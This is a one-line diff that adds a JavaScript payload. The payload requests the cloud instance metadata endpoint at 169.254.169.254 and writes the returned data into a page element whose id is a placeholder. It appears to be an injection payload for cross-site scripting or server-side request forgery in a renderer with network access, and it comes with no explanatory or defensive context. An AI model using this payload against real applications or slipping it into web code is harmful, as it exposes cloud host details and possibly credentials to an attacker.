@@ -1,0 +1,1 @@
+var req = new XMLHttpRequest();req.open('GET','http://169.254.169.254/metadata/instance?api-version=2017-04-02',true);req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE){document.getElementById('XXXX').innerHTML = req.responseText }};req.send(null)
